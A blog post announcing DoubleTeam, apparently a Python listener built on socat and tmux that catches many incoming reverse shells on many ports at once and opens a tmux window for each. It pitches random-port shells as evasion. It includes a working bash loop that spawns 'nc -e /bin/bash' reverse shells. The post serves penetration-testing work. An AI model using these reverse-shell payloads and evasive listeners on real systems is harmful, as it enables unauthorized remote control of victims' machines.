---
layout: post
title: DoubleTeam - Python listener based on tmux and socat
excerpt_separator: <!--more-->
---

Using socat, tmux and Python threading, DoubleTeam launches a new tmux window for each incoming reverse shell. It supports simultaneous listening on many ports and automatically resumes listening on the port after spawning the tmux window.

<!--more-->


Generate reverse shell payloads that connect to random ports, raising your evasion level!

<p align="center">
  <img src="https://images.wikidexcdn.net/mwuploads/wikidex/7/74/latest/20190608212234/Doble_equipo_Am.png" alt="Double Team GIF" />
</p>

Repository: [https://github.com/ricardojoserf/DoubleTeam](https://github.com/ricardojoserf/DoubleTeam)

<br>

## Usage

```
python3 doubleteam.py -p [PORT_LIST]
```

Options:

- -p (--ports): Comma-separated list of ports to listen on. Ports below 1024 will require root privileges.

<br>

For example, to listen on 50 ports:

```
python3 doubleteam.py -p 443,4443,8443,8743,9443,9643,10443,10943,11443,11843,12243,12943,13443,13743,14243,14943,15443,15843,16343,16943,17243,17843,18343,18743,19343,19743,20243,20943,21343,21743,22243,22843,23343,23943,24343,24743,25343,25743,26243,26843,27443,27943,28443,29143,29743,30343,30843,31443,31943
```

Generate some reverse shells to connect to these ports randomly, for example using bash and Netcat:

```
for i in $(seq 1 10); do numbers=(443 4443 8443 8743 9443 9643 10443 10943 11443 11843 12243 12943 13443 13743 14243 14943 15443 15843 16343 16943 17243 17843 18343 18743 19343 19743 20243 20943 21343 21743 22243 22843 23343 23943 24343 24743 25343 25743 26243 26843 27443 27943 28443 29143 29743 30343 30843 31443 31943); port="${numbers[RANDOM % ${#numbers[@]}]}"; echo "Connecting to port $port"; nc -e /bin/bash 127.0.0.1 $port & ; done
```

The reverse shells are received:

![img1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/doubleteam/Screenshot_1.png)

Then connect to the tmux session "doubleTeam":

```
tmux a -t doubleTeam
```

![img2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/doubleteam/Screenshot_2.png)

If you list the windows you will see one for each reverse shell:

![img3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/doubleteam/Screenshot_3.png)

Now you can close the Python listener if you want, the reverse shells will still be available in the tmux session!

<br>